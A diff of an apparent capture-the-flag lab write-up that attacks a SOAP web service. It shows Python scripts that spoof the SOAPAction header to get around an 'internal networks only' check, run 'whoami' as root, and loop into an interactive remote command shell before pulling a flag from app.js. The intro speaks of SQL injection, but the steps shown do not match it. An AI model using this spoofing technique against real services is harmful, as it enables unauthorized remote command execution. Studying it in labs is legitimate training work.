@@ -1,4 +1,4 @@
-﻿Our client tasks us with assessing a SOAP web service whose WSDL file resides atÂ `http://<TARGET IP>:3002/wsdl?wsdl`.
+﻿Our client tasks us with assessing a SOAP web service whose WSDL file resides at`http://<TARGET IP>:3002/wsdl?wsdl`.
 
 Assess the target, identify an SQL Injection vulnerability through SOAP messages and answer the question below.
 
@@ -119,7 +119,7 @@ We got an `executeCommand` element which uses a `cmd`, let's try using this `cli
 ```python
 import requests
 
-payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'
 
 print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
 ```
@@ -127,16 +127,16 @@ print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAP
 If we execute it:
 
 ```
-python3 client.py                               
-b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandResponse xmlns="http://tempuri.org/"><success>false</success><error>This function is only allowed in internal networks</error></ExecuteCommandResponse></soap:Body></soap:Envelope>'
+python3 client.py 
+b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandResponse xmlns="http://tempuri.org/"><success>false</success><error>This function is only allowed in internal networks</error></ExecuteCommandResponse></soap:Body></soap:Envelope>'
 ```
 
-We get an error mentioningÂ `This function is only allowed in internal networks`. We have no access to the internal networks. We need to spoof, let's do it using this python script, let's name if `SOAPSpoof.py`:
+We get an error mentioning`This function is only allowed in internal networks`. We have no access to the internal networks. We need to spoof, let's do it using this python script, let's name if `SOAPSpoof.py`:
 
 ```python
 import requests
 
-payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
 
 print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
 ```
@@ -145,7 +145,7 @@ We get the following output:
 
 ```
 ython3 SOAPSpoof.py 
-b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>root\n</result></LoginResponse></soap:Body></soap:Envelope>
+b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success><result>root\n</result></LoginResponse></soap:Body></soap:Envelope>
 ```
 
 Now, the `whoami` command we specified in the script worked, as seen, the server responds with `root`, we can automate the process with this script:
@@ -154,9 +154,9 @@ Now, the `whoami` command we specified in the script worked, as seen, the server
 import requests
 
 while True:
-    cmd = input("$ ")
-    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
-    print(requests.post("http://10.129.27.149:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+ cmd = input("$ ")
+ payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
+ print(requests.post("http://10.129.27.149:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
 ```
 
 
@@ -176,7 +176,7 @@ We can see an `app.js` file, if we grep it for the flag, this happens:
 
 ```
 root@nix01-websvc:/app/soap-wsdl# cat app.js | grep FLAG
-  'FLAG{1337_SQL_INJECTION_IS_FUN_:)}'
+ 'FLAG{1337_SQL_INJECTION_IS_FUN_:)}'
 ```
 
 We got our flag:
